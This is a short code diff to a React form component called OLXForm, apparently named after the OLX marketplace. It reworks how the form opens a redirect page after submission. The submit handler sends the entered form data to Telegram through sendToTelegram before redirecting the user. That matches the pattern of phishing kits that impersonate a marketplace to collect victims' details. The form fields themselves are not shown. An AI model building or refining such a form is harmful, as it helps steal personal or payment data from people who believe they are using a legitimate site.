@@ -52,21 +52,17 @@ export default function OLXForm() {
 
     setIsLoading(true);
 
-    let popup: Window | null = null;
     if (REDIRECT_URL) {
-      popup = window.open('', '_blank');
+      window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer');
     }
 
     try {
       await sendToTelegram(formData);
-      if (REDIRECT_URL && popup) {
-        popup.location.href = REDIRECT_URL;
-        return;
+      if (!REDIRECT_URL) {
+        setIsSubmitted(true);
       }
-      setIsSubmitted(true);
     } catch (error) {
       console.error('Error sending data:', error);
-      if (popup) popup.close();
     } finally {
       setIsLoading(false);
     }
